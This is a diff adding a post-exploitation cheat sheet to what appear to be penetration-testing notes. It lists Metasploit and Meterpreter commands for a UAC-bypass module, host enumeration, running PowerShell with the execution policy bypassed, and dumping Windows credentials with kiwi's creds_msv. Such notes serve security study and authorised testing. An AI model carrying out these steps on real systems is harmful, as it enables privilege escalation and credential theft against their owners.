@@ -108,4 +108,26 @@ meterpreter > getenv someenvvar
 
 ## Post-exploitation
 
+```
+PS > ^z # background channel
+meterpreter > bg # background session, get number
+msf > search uac
+msf > search enumeration hosts
+msf > use exploit/windows/local/bypassuac_sdclt
+msf > use post/windows/gather/enum_hostfile
+msf (exploit|post) > show options
+msf xxx > set session session_number
+msf xxx > run
+meterpreter > shell
+cmd > powershell -ep bypass
+PS > Import-Module NtObjectManager
+PS > Get-NtTokenIntegrityLevel
+PS > exit # or ^z
+meterpreter > load kiwi
+meterpreter > help
+meterpreter > creds_msv
+```
+
+## Pivoting
+
 
